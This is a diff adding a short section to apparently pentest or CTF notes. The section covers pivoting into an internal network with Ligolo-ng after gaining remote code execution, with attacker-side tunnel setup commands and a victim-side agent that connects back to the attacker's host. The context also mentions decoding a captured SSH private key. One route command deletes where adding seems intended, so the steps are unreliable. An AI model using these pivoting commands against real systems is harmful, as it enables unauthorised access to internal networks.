@@ -69,3 +69,25 @@ If we got a users id_rsa ssh key and we dont know the user which the public key 
 ```
 cat id_rsa | base64 -d | xxd
 ```
+
+## Pivoting into a network - Ligolo-ng
+Suppose we got a rce on a machine which is faced towards internet and also have a internal network (ex; 192.168.2.0/24) and we want to connect to that machine to enum further.
+
+Attacker machine(kali linux)
+```
+sudo ip tuntap add user <user> mode tun ligolo
+sudo ip link set ligolo up
+sudo ip route del 192.168.2.0/24 dev ligolo
+```
+```
+./proxy --selfcert 
+```
+```
+ligolo> session 1
+ligolo> start
+```
+
+Victim machine (ubnutu)
+```
+./agent -connect <kaliip:kaliport> --ignore-cert
+```
